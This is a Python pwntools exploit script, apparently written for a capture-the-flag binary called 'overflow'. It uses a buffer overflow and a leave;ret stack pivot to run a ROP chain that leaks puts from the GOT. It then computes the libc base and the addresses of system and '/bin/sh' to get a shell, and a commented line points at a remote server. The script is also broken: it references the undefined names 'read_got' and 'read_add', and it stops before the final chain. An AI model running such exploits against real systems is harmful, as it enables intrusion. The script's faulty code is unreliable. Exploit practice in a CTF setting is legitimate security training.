from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')

sl=lambda x:io.sendline(x)
sd=lambda x:io.send(x)
sa=lambda x,y:io.sendafter(x,y)
sla=lambda x,y:io.sendlineafter(x,y)
rc=lambda x:io.recv(x)
rl=lambda :io.recvline()
ru=lambda x:io.recvuntil(x)
ita=lambda :io.interactive()
slc=lambda :asm(shellcraft.sh())
uu64=lambda x:u64(x.ljust(8,b'\0'))
uu32=lambda x:u32(x.ljust(4,b'\0'))
def gdba(x=''):
	if type(io)==pwnlib.tubes.remote.remote:
		return
	elif type(io)==pwnlib.tubes.process.process:
		gdb.attach(io,x)
		pause()

io = process('./overflow')
elf = ELF('./overflow')
libc=ELF('./libc.so.6')
# io = remote("180.76.166.28",40001)

fak_sta=0x6010a0
read_2=0x400700
pop_rdi=0x4007a3
lve_ret=0x400718
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']

pay1=flat([b'a'*0x100,fak_sta+0x120,pop_rdi,puts_got,puts_plt,0x0000000004006C7])

sa('name',pay1)
pause()

pay2=flat([b'a'*0x70,fak_sta+0x100,lve_ret])
sa('data',pay2)
pause()

puts_add=uu64(ru(b'\x7f')[-6:])
print(hex(puts_add))
print('puts',hex(libc.sym['puts']))

libc_base=puts_add-libc.sym['puts']
sys_add=libc_base+libc.sym['system']
sh_add=libc_base+libc.search(b'/bin/sh').__next__()

pay1=flat([b'a'*0x100,fak_sta+0x120,pop_rdi,read_got,puts_plt,0x0000000004006C7])

sa('name',pay1)
pause()

pay2=flat([b'a'*0x70,fak_sta+0x100,lve_ret])
sa('data',pay2)
pause()

read_addr=uu64(ru(b'\x7f')[-6:])
print(hex(read_addr))
print('read',hex(libc.sym['read']))

libc_base=read_add-libc.sym['read']


ita()